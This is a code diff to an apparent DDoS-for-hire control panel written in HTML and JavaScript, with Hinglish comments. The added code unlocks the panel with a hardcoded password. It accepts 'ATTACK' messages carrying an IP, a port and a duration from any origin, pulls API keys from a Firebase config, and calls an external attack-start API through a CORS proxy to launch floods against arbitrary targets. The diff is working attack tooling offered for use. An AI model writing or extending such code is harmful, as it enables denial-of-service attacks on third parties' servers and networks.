@@ -42,6 +42,12 @@
     </div>
 
     <div id="mainPanel" class="hidden">
+        <!-- App ke liye chhupa hua connect point -->
+        <div id="appConnectBox" class="box" style="border-color: #00e5ff; display: none;">
+            <h2 style="color: #00e5ff;">📱 𝐀𝐏𝐏 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃</h2>
+            <p style="font-size: 12px;">App is ready to send attacks through this website.</p>
+        </div>
+
         <div class="box">
             <h2>🌐 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐔𝐑𝐋</h2>
             <input type="text" id="dbUrl" placeholder="https://xxx.firebaseio.com/">
@@ -126,6 +132,7 @@
             if (pass === "veil") { 
                 document.getElementById('loginBox').classList.add('hidden');
                 document.getElementById('mainPanel').classList.remove('hidden');
+                document.getElementById('appConnectBox').style.display = 'block'; // Show App Connect
                 fetchKillStatus();
                 fetchKeys();
                 fetchApis();
@@ -335,6 +342,55 @@
                 fetchKeys();
             }
         }
+
+        // ==========================================
+        // APP CONNECTION LOGIC (Bina API ke attack)
+        // ==========================================
+        window.addEventListener("message", async function(event) {
+            // App se message aayega
+            if (event.data && event.data.action === "ATTACK") {
+                const { ip, port, duration } = event.data;
+                const db = dbUrlInput.value;
+                
+                if(!db) {
+                    event.source.postMessage({status: "ERROR", message: "Database URL not set in Panel"}, "*");
+                    return;
+                }
+
+                // Fetch API key from DB
+                try {
+                    const res = await fetch(`${db}settings/config.json`);
+                    const data = await res.json();
+                    let apiKey = "";
+                    for(let i=1; i<=10; i++) {
+                        if(data[`api_key_${i}`] && data[`api_key_${i}`].trim() !== "") {
+                            apiKey = data[`api_key_${i}`].trim();
+                            break;
+                        }
+                    }
+
+                    if(!apiKey) {
+                        event.source.postMessage({status: "ERROR", message: "No API in Panel"}, "*");
+                        return;
+                    }
+
+                    // Call API
+                    const targetUrl = `https://delvorn.vynqo.in/api/attack/start?key=${apiKey}&ip=${ip}&port=${port}&time=${duration}`;
+                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                    
+                    const apiRes = await fetch(proxyUrl);
+                    const apiText = await apiRes.text();
+
+                    if (apiText.includes('"status": "success"') || apiText.includes('"status":"success"')) {
+                        event.source.postMessage({status: "SUCCESS", message: "Attack Launched!"}, "*");
+                    } else {
+                        event.source.postMessage({status: "ERROR", message: "API Failed: " + apiText}, "*");
+                    }
+                } catch(e) {
+                    event.source.postMessage({status: "ERROR", message: "Network Error"}, "*");
+                }
+            }
+        });
     </script>
 </body>
 </html>
